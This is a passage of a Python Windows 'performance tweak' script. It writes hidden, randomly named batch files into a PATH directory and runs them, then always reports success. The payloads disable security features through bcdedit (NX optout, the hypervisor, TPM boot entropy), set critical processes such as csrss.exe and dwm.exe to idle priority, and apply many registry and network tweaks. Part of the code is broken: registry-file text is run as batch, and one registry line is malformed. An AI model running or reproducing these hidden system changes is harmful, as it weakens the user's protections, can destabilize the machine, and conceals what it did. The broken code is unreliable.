netsh interface tcp set global ecncapability=disabled
netsh int tcp set global autotuninglevel=restricted
netsh int tcp set global ecncapability=disabled
netsh int tcp set global timestamps=disabled
netsh int tcp set global initialRto=2000
netsh int tcp set global rsc=enabled
netsh int tcp set global ecncapability=disabled
netsh int tcp set global autotuninglevel=disabled
netsh int tcp set heuristics disabled
netsh int tcp set global chimney=disabled
netsh int tcp set global dca=enabled
netsh int tcp set global rss=enabled
netsh int tcp set global netdma=enabled
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set global timestamps=disabled
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set supplemental template=custom icw=8,5

@echo
@echo Disable HPET
bcdedit /deletevalue useplatformclock
@echo
@echo Disable dynamic tick (laptop power savings)
bcdedit /set disabledynamictick yes
@echo
@echo Disable synthetic timers
bcdedit /set useplatformtick yes
@echo
@echo Boot timeout 0
bcdedit /timeout 0
@echo
@echo Disable nx
bcdedit /set nx optout
@echo
@echo Disable boot screen animation
bcdedit /set bootux disabled
@echo
@echo Speed up boot times
bcdedit /set bootmenupolicy standard
@echo
@echo Disable hyper virtualization
bcdedit /set hypervisorlaunchtype off
@echo
@echo Disable trusted platform module (TPM)
bcdedit /set tpmbootentropy ForceDisable
@echo
@echo Remove windows login logo
bcdedit /set quietboot yes
@echo
@echo
@echo Disable boot logo
bcdedit /set {globalsettings} custom:16000067 true
@echo
@echo Disable spinning animation
bcdedit /set {globalsettings} custom:16000069 true
@echo
@echo Disable boot messages
bcdedit /set {globalsettings} custom:16000068 true
@echo
Cls
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def Unknow4():
    System.Clear()

    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
    Windows Registry Editor Version 5.00 edit 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1]

"Attributes"="-1"
"creator"="! Sonic .#6074"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\GameDVR]

"AppCaptureEnabled"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games]
"GPU Priority"=dword:00000008
"Priority"=dword:00000006
"Scheduling Category"="High"
"SFIO Priority"="High"
"creator"="! Sonic .#6074"

[HKEY_CURRENT_USER\System\GameConfigStore]

"GameDVR_Enabled"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile]

"SystemResponsiveness"=dword:00000001
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR]

"value"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_CURRENT_USER\System\GameConfigStore]

"GameDVR_FSEBehaviorMode"=dword:00000000

"GameDVR_HonorUserFSEBehaviorMode"=dword:00000000

"GameDVR_FSEBehavior"=dword:00000000

"GameDVR_DXGIHonorFSEWindowsCompatible"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks]
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000006
"Background Only"="True"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000005
"Background Only"="True"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing]
"Affinity"=dword:00000000
"Background Only"="True"
"BackgroundPriority"=dword:00000008
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000008
"Priority"=dword:00000008
"Scheduling Category"="High"
"SFIO Priority"="Normal"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000004
"Background Only"="True"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games]
"Scheduling Category"="High"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="High"
"Priority"=dword:00000006
"Background Only"="False"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000006
"Background Only"="True"
"Latency Sensitive"="True"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"BackgroundPriority"=dword:00000004
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000003
"Background Only"="False"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio]
"Scheduling Category"="High"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000001
"Background Only"="False"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000005
"Background Only"="True"
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AFD\Parameters]
"DefaultReceiveWindow=dword:00012800
"DefaultSendWindow"=dword:00001280
"EnableDynamicBacklog"=dword:00000001	
"MinimumDynamicBacklog"=dword:00000020
"MaximumDynamicBacklog"=dword:00001000
"DynamicBacklogGrowthDelta"=dword:00000020
"KeepAliveInterval"=dword:00000001
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters]
"MaxCmds"=dword:0000001e
"MaxThreads"=dword:0000001e
"MaxCollectionCount"=dword:00000020
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]
"LargeSystemCache"=dword:00000000
"IoPageLockLimit"=dword:000f0000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows]
"NonBestEffortLimit"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Psched]
"NonBestEffortLimit"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl]
"Win32PrioritySeparation"=hex(b):02,00,00,00,00,00,00,00
"IRQ8Priority"=hex(b):01,00,00,00,00,00,00,00
"IRQ16Priority"=hex(b):02,00,00,00,00,00,00,00
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters]
"EnableICMPRedirect"=dword:00000000
"DisableMediaSenseEventLog"=dword:00000001
"DisableRss"=dword:00000000
"DisableTaskOffload"=dword:00000000
"DisableTcpChimneyOffload"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583]
"ValueMin"=dword:00000000
"ValueMax"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583]
"ValueMax"=dword:00000000
"ValueMin"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583]
"ValueMax"=dword:00000000
"ValueMin"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power]
"HibernateEnabled"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Power]
"HiberbootEnabled"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c]
"ValueMax"=dword:00000064
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c]
"ValueMax"=dword:00000064
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler]
"VsyncIdleTimeout"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_CURRENT_USER\System\GameConfigStore]
"GameDVR_Enabled"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR]
"AppCaptureEnabled"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\GameDVR]
"AllowgameDVR"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SOFTWARE\Intel\GMM]
"DedicatedSegmentSize"=dword:00000512
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl]
"Win32PrioritySeparation"=dword:00000026
"IRQ8Priority"=dword:00000001
"IRQ16Priority"=dword:00000002
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\PriorityControl]
"Win32PrioritySeparation"=dword:00000026
"IRQ8Priority"=dword:00000001
"IRQ16Priority"=dword:00000002
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters]
"EnablePrefetcher"=dword:00000000
"EnableSuperfetch"=dword:00000000
"EnableBoottrace"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
"NoLowDiskSpaceChecks"=dword:00000001
"LinkResolveIgnoreLinkInfo"=dword:00000001
"NoResolveSearch"=dword:00000001
"NoResolveTrack"=dword:00000001
"NoInternetOpenWith"=dword:00000001
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem]
"NtfsMftZoneReservation"=dword:00000001
"NTFSDisable8dot3NameCreation"=dword:00000001
"DontVerifyRandomDrivers"=dword:00000001
"NTFSDisableLastAccessUpdate"=dword:00000001
"ContigFileAllocSize"=dword:00000040
"creator"="! Sonic .#6074"
[HKEY_CURRENT_USER\Control Panel\Desktop]
"AutoEndTasks"="1"
"MenuShowDelay"="0"
"WaitToKillAppTimeout"="5000"
"WaitToKillServiceTimeout"="1000"
"HungAppTimeout"="4000"
"LowLevelHooksTimeout"="1000"
"ForegroundLockTimeout"="150000"
"creator"="! Sonic .#6074"
[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Games]
"FpsAll"=dword:00000001
"GameFluidity"=dword:00000001
"FpsStatusGames"=dword:00000010
"FpsStatusGamesAll"=dword:00000004
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games]
"Affinity"=dword:00000000
"Background Only"="False"
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000008
"Priority"=dword:00000002
"Scheduling Category"="High"
"SFIO Priority"="High"
"Latency Sensitive"="True"
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency]
"Affinity"=dword:00000000
"Background Only"="False"
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000008
"Priority"=dword:00000002
"Scheduling Category"="High"
"SFIO Priority"="High"
"Latency Sensitive"="True"
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\BIOS]
"CPUPriority"=dword:00000001
"FastDRAM"=dword:00000001
"PCIConcur"=dword:00000001
"AGPConcur"=dword:00000001
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer]
"Max Cached Icons"="2000"
"AlwaysUnloadDLL"=dword:00000001
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnloadDLL]
"Default"=dword:00000001
"creator"="! Sonic .#6074"
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
"EnableBalloonTips"=dword:00000000
"creator"="! Sonic .#6074"
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSMQ\Parameters]
"TCPNoDelay"=dword:00000001
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSMQ\Parameters]

"TCPNoDelay"=dword:0000001
"TcpNoDelay"=dword:0000001
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games]

"Scheduling Category"="High"
"SFIO Priority"="High"
"Background Only"="False"
"Priority"=dword:00000001
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000001
"Affinity"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency]

"Scheduling Category"="High"
"SFIO Priority"="High"
"Background Only"="False"
"Priority"=dword:00000001
"Latency Sensitive"="True"
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000002
"Affinity"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio]

"Scheduling Category"="High"
"SFIO Priority"="High"
"Background Only"="True"
"Priority"=dword:00000001
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000002
"Affinity"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio]

"Scheduling Category"="High"
"SFIO Priority"="High"
"Background Only"="False"
"Priority"=dword:00000001
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000005
"Affinity"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability]

"TimeStampInterval"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\cdrom]

"AutoRun"=dword:00000000
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl]

"IRQ8Priority"=dword:00000001
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters]

"SizReqBuf"=dword:00004410
"creator"="! Sonic .#6074"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanWorkstation\Parameters]

"DisableBandwidthThrottling"=dword:00000001
"DisableLargeMtu"=dword:00000000
"MaxCmds"=dword:0000001e
"MaxThreads"=dword:0000001e
"MaxCollectionCount"=dword:0000020
"KeepConn"=dword:00015180
"creator"="! Sonic .#6074"
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)

def fix1():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
@echo off

(
sc config "BITS" start= auto
sc start "BITS"
for /f "tokens=3" %%a in ('sc queryex "BITS" ^| findstr "PID"') do (set pid=%%a)
) >nul 2>&1
wmic process where name="javaw.exe" CALL setpriority "realtime"
cls
wmic process where name="svchost.exe" CALL setpriority "idle"
cls
wmic process where name="explorer.exe" CALL setpriority "high"
cls
wmic process where name="mDNSResponder.exe" CALL setpriority "idle"
cls
wmic process where name="BRTSvc.exe" CALL setpriority "idle"
cls
wmic process where name="csrss.exe" CALL setpriority "idle"
cls
wmic process where name="dwm.exe" CALL setpriority "idle"
cls
wmic process where name="rundll32.exe" CALL setpriority "idle"
cls
wmic process where name="nvvsvc.exe" CALL setpriority "idle"
cls
wmic process where name="taskhost.exe" CALL setpriority "idle"
cls
wmic process where name="taskmgr.exe" CALL setpriority "idle"
cls
wmic process where name="dllhost.exe" CALL setpriority "idle"
cls
wmic process where name="dashost.exe" CALL setpriority "idle"
cls
wmic process where name="TCPSVCS.EXE" CALL setpriority "idle"
cls
wmic process where name="SetTimerResolutionService.exe" CALL setpriority "realtime"
cls
wmic process where name="WmiPrvSE.exe" CALL setpriority "idle"
cls
wmic process where name="svchost.exe (NetworkService)" CALL setpriority "idle"
cls
wmic process where name="cheatbreaker.exe" CALL setpriority "high priority"
cls
wmic process where name="svchost.exe" CALL setpriority "idle"
cls
net stop w32time && w32tm /unregister && w32tm /register && net start w32time && w32tm /resync
    ''', 'utf-8'))
    _open = popen('attrib +h ' + file_location)
    _open.read()
    call(file_location)
    System.Clear()
    print(dataloadedsuccessfullymsg)
    print(dataloadedsuccessfullypic)
    print(dataloadedsuccessfullymsg)
def fix2():
    System.Clear()
    file_location = environ['PATH'].split(';')[0] + f'''\\{token_hex(16)}.bat'''
    open(file_location, 'wb').write(bytes('''
Windows Registry Editor Version 5.00 edit 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1]

"Attributes"="-1"
"creator"="Sincare#2267"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\GameDVR]

"AppCaptureEnabled"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games]
"GPU Priority"=dword:00000008
"Priority"=dword:00000006
"Scheduling Category"="High"
"SFIO Priority"="High"
"creator"="Sincare#2267"

[HKEY_CURRENT_USER\System\GameConfigStore]

"GameDVR_Enabled"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile]

"SystemResponsiveness"=dword:00000001
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR]

"value"=dword:00000000
"creator"="Sincare#2267"

[HKEY_CURRENT_USER\System\GameConfigStore]

"GameDVR_FSEBehaviorMode"=dword:00000000

"GameDVR_HonorUserFSEBehaviorMode"=dword:00000000

"GameDVR_FSEBehavior"=dword:00000000

"GameDVR_DXGIHonorFSEWindowsCompatible"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks]
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000006
"Background Only"="True"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Capture]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000005
"Background Only"="True"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing]
"Affinity"=dword:00000000
"Background Only"="True"
"BackgroundPriority"=dword:00000008
"Clock Rate"=dword:00002710
"GPU Priority"=dword:00000008
"Priority"=dword:00000008
"Scheduling Category"="High"
"SFIO Priority"="Normal"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000004
"Background Only"="True"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games]
"Scheduling Category"="High"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="High"
"Priority"=dword:00000006
"Background Only"="False"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000006
"Background Only"="True"
"Latency Sensitive"="True"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"BackgroundPriority"=dword:00000004
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000003
"Background Only"="False"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio]
"Scheduling Category"="High"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000001
"Background Only"="False"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager]
"Scheduling Category"="Medium"
"GPU Priority"=dword:00000008
"Affinity"=dword:00000000
"Clock Rate"=dword:00002710
"SFIO Priority"="Normal"
"Priority"=dword:00000005
"Background Only"="True"
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AFD\Parameters]
"DefaultReceiveWindow=dword:00012800
"DefaultSendWindow"=dword:00001280
"EnableDynamicBacklog"=dword:00000001	
"MinimumDynamicBacklog"=dword:00000020
"MaximumDynamicBacklog"=dword:00001000
"DynamicBacklogGrowthDelta"=dword:00000020
"KeepAliveInterval"=dword:00000001
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters]
"MaxCmds"=dword:0000001e
"MaxThreads"=dword:0000001e
"MaxCollectionCount"=dword:00000020
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]
"LargeSystemCache"=dword:00000000
"IoPageLockLimit"=dword:000f0000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows]
"NonBestEffortLimit"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Psched]
"NonBestEffortLimit"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl]
"Win32PrioritySeparation"=hex(b):02,00,00,00,00,00,00,00
"IRQ8Priority"=hex(b):01,00,00,00,00,00,00,00
"IRQ16Priority"=hex(b):02,00,00,00,00,00,00,00
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters]
"EnableICMPRedirect"=dword:00000000
"DisableMediaSenseEventLog"=dword:00000001
"DisableRss"=dword:00000000
"DisableTaskOffload"=dword:00000000
"DisableTcpChimneyOffload"=dword:00000000
"creator"="Sincare#2267"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583]
"ValueMin"=dword:00000000
"ValueMax"=dword:00000000
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583]
"ValueMax"=dword:00000000
"ValueMin"=dword:00000000
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583]
"ValueMax"=dword:00000000
"ValueMin"=dword:00000000
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power]
"HibernateEnabled"=dword:00000000
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Power]
"HiberbootEnabled"=dword:00000000
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c]
"ValueMax"=dword:00000064
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c]
"ValueMax"=dword:00000064
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler]
"VsyncIdleTimeout"=dword:00000000
"creator"="Sincare#2267"
[HKEY_CURRENT_USER\System\GameConfigStore]
"GameDVR_Enabled"=dword:00000000
"creator"="Sincare#2267"
[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR]
"AppCaptureEnabled"=dword:00000000
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\GameDVR]
"AllowgameDVR"=dword:00000000
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SOFTWARE\Intel\GMM]
"DedicatedSegmentSize"=dword:00000512
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl]
"Win32PrioritySeparation"=dword:00000026
"IRQ8Priority"=dword:00000001
"IRQ16Priority"=dword:00000002
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\PriorityControl]
"Win32PrioritySeparation"=dword:00000026
"IRQ8Priority"=dword:00000001
"IRQ16Priority"=dword:00000002
"creator"="Sincare#2267"
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters]
"EnablePrefetcher"=dword:00000000
"EnableSuperfetch"=dword:00000000
"EnableBoottrace"=dword:00000000
"creator"="Sincare#2267"
